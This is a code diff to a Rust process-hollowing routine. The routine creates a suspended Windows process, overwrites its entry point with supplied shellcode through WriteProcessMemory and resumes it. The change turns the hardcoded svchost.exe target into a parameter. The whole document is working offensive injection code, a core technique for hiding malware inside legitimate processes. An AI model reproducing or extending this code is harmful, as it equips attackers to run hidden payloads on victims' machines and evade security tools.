@@ -10,7 +10,7 @@ const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE as u32 * 6;
 const E_LFANEW_OFFSET: usize = 0x3C;
 const OPTHDR_ADDITIONAL_OFFSET: usize = 0x28;
 
-pub fn hollow_and_run(shellcode: &[u8]) {
+pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // Create empty StartupInfoA struct for use in CreateProcess
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.STARTUPINFOW.html
@@ -26,7 +26,7 @@ pub fn hollow_and_run(shellcode: &[u8]) {
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessW.html
     let lp_application_name: PSTR = unsafe { mem::zeroed() };
     let mut lp_command_line: PSTR = unsafe { mem::zeroed() };
-    lp_command_line.0 = CString::new("C:\\Windows\\System32\\svchost.exe").unwrap().into_raw() as *mut u8;
+    lp_command_line.0 = CString::new(target_process).unwrap().into_raw() as *mut u8;
     let lp_current_directory: PSTR = unsafe { mem::zeroed() };
     let creation_result = unsafe { CreateProcessA(
         lp_application_name,
@@ -40,7 +40,7 @@ pub fn hollow_and_run(shellcode: &[u8]) {
         &startup_info,
         &mut process_information) };
     if !creation_result.as_bool() {
-        panic!("Could not create the suspended process with CreateProcessA");
+        panic!("Could not create the suspended {target_process} with CreateProcessA");
     }
 
     // Create empty PROCESS_BASIC_INFORMATION struct for use in ZwQueryInformationProcess
@@ -90,7 +90,7 @@ pub fn hollow_and_run(shellcode: &[u8]) {
 
     let write_result = unsafe { WriteProcessMemory(process_handle, entry_point_address as *const c_void, shellcode.as_ptr() as *const c_void, shellcode.len(), ptr::null_mut()) };
     if !write_result.as_bool() {
-        panic!("Could not write the shellcode to the suspended process with WriteProcessMemory");
+        panic!("Could not write the shellcode to the suspended {target_process} with WriteProcessMemory");
     }
 
     // Start it back up with ResumeThread
@@ -98,6 +98,6 @@ pub fn hollow_and_run(shellcode: &[u8]) {
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.ResumeThread.html
     let resume_result = unsafe { ResumeThread(process_information.hThread) };
     if resume_result != 1 {
-        panic!("Could not resume the suspended process' execution");
+        panic!("Could not resume the suspended {target_process}'s execution");
     }
 }
